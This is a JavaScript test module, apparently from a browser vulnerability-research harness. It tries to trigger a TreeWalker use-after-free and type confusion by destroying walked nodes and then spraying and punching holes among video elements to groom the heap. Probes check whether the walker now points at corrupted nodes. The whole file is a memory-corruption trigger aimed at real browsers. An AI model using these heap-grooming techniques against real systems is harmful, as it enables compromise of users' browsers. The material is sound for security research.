import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'TREEWALKER_TYPE_CONFUSION',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'O TreeWalker C++ retém ponteiros nativos. Mutamos os nós por baixo e forçamos ' +
        'outros tipos (vídeo/áudio) a ocuparem o mesmo espaço de memória (Type Confusion).',

    setup: function() {
        this.sandbox = document.createElement('div');
        this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
        document.body.appendChild(this.sandbox);
        
        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
        this.walker.nextNode(); // span
        this.walker.nextNode(); // b
        
        this.targetNode = this.walker.currentNode;

        // 🚨 Oráculo: Vigia o Nó B
        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
    },

    trigger: function() {
        // Destrói os nós onde o Walker está pisando.
        this.sandbox.innerHTML = '<video></video><audio></audio>';
        
        // 🚨 Grooming: Forçamos a alocação de objetos complexos (vídeos)
        // para tentarem preencher o endereço de memória deixado pelo <b> (Type Confusion)
        let nodes = Groomer.sprayDOM('video', 100);
        Groomer.punchHoles(nodes, 2);
    },

    probe: [
        s => s.walker.currentNode.nodeType,
        s => s.walker.currentNode.nodeName,
        s => s.walker.currentNode.isConnected, 
        s => s.walker.previousNode() !== null, 
        s => s.targetNode.nodeType,            
        s => s.targetNode.isConnected          
    ],

    cleanup: function() {
        try { this.sandbox.remove(); } catch(e) {}
    }
};
